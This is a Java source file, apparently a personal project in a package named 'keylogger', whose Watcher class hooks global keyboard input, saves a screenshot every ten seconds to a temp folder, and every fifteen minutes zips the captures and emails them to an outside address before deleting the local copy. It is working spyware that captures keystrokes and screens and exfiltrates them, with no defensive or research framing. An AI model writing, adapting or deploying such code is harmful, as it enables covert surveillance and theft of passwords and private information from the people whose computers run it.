/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

/**
 *
 * @author john
 */
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;
import org.apache.commons.io.FileUtils;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * @author javaQuery Global Keyboard Listener
 */
public class Watcher {

    public static String folderName = System.getProperty("java.io.tmpdir") + File.separator + "watcher";
    public static String zipFileName = System.getProperty("java.io.tmpdir") + File.separator;
    public static File watcherFolder = new File(folderName);

    public static void main(String[] args) {
        watcherFolder = new File(folderName);
        if (!watcherFolder.exists()) {
            watcherFolder.mkdirs();
        }

        /* Its error */
        System.out.println("start thread");
        Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    GlobalScreen.registerNativeHook();
                } catch (NativeHookException ex) {
                    Logger.getLogger(Watcher.class.getName()).log(Level.SEVERE, null, ex);
                }
                GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
            }
        });
        thread.start();
        Timer screenCapture = new Timer();
        screenCapture.schedule(new Screen(), 0, 10000);
        Timer sendMail = new Timer();
        sendMail.schedule(new Send(), 0, 900000);

        /* Construct the example object and initialze native hook. */
    }

    public static class Send extends TimerTask {

        @Override
        public void run() {
            ZipHelper zippy = new ZipHelper();
            try {
                SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_hh-mm-ss_a");
                Calendar now = Calendar.getInstance();
                String zipName = zipFileName + formatter.format(now.getTime()) + ".zip";
                zippy.zipDir(folderName, zipName);
                System.out.println("zipped");
                SendMail.init().sendMail("honza.kusy@gmail.com", "jkusy@seznam.cz", zipName);

                FileUtils.deleteDirectory(watcherFolder);
                watcherFolder.mkdirs();
            } catch (IOException e2) {
                System.err.println(e2);
            }

        }

        class ZipHelper {

            public void zipDir(String dirName, String nameZipFile) throws IOException {
                ZipOutputStream zip = null;
                FileOutputStream fW = null;
                fW = new FileOutputStream(nameZipFile);
                zip = new ZipOutputStream(fW);
                addFolderToZip("", dirName, zip);
                zip.close();
                fW.close();
            }

            private void addFolderToZip(String path, String srcFolder, ZipOutputStream zip) throws IOException {
                File folder = new File(srcFolder);
                if (folder.list().length == 0) {
                    addFileToZip(path, srcFolder, zip, true);
                } else {
                    for (String fileName : folder.list()) {
                        if (path.equals("")) {
                            addFileToZip(folder.getName(), srcFolder + "/" + fileName, zip, false);
                        } else {
                            addFileToZip(path + "/" + folder.getName(), srcFolder + "/" + fileName, zip, false);
                        }
                    }
                }
            }

            private void addFileToZip(String path, String srcFile, ZipOutputStream zip, boolean flag) throws IOException {
                File folder = new File(srcFile);
                if (flag) {
                    zip.putNextEntry(new ZipEntry(path + "/" + folder.getName() + "/"));
                } else {
                    if (folder.isDirectory()) {
                        addFolderToZip(path, srcFile, zip);
                    } else {
                        byte[] buf = new byte[1024];
                        int len;
                        FileInputStream in = new FileInputStream(srcFile);
                        zip.putNextEntry(new ZipEntry(path + "/" + folder.getName()));
                        while ((len = in.read(buf)) > 0) {
                            zip.write(buf, 0, len);
                        }
                    }
                }
            }
        }

    }

    public static class Screen extends TimerTask {

        @Override
        public void run() {
            try {
                capture();
            } catch (Exception ex) {
                Logger.getLogger(Watcher.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        public void capture() throws Exception {
            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_hh-mm-ss_a");
            Calendar now = Calendar.getInstance();
            Robot robot = new Robot();
            BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(screenShot, "JPG", new File(Watcher.folderName + File.separator + formatter.format(now.getTime()) + ".jpg"));
            //System.out.println(formatter.format(now.getTime()));
        }

    }

}
